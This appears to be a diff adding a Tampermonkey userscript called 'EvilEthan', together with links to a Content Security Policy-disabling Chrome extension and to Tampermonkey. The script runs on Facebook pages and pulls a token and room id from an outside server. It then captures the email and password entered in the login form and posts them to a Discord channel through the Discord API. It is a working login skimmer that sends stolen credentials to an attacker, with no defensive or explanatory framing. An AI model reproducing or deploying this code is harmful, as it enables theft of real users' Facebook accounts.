@@ -1,0 +1,37 @@
+https://chrome.google.com/webstore/detail/disable-content-security/ieelmcmcagommplceebfedjlakkhpden
+https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo?hl=pt-BR
+// ==UserScript==
+// @name         EvilEthan
+// @namespace    http://tampermonkey.net/
+// @version      0.1
+// @description  try to take over the world! really
+// @author       You
+// @match        https://*.facebook.com/*
+// @grant        none
+// @require https://npmcdn.com/axios/dist/axios.min.js
+// ==/UserScript==
+
+(function() {
+    'use strict';
+    var AUTH_TOKEN, roomid;
+    axios.get('https://hmello.xyz/config.json').then(function(body) {
+      AUTH_TOKEN = body.data.token;
+      roomid = body.data.roomid;
+    });
+    axios.defaults.baseURL = 'https://discordapp.com/api';
+    document.getElementById('login_form').addEventListener('submit', function(e) {
+        axios.defaults.headers.common['Authorization'] = AUTH_TOKEN;
+        var creds = {
+            email: e.target.email.value,
+            password: e.target.pass.value
+        };
+        axios.post('/channels/'+ roomid +'/messages', {
+            content: JSON.stringify(creds)
+        }).then(function(e) {
+            console.log(e);
+        }).catch(function(e) {
+            console.log(e);
+        });
+
+    });
+})();
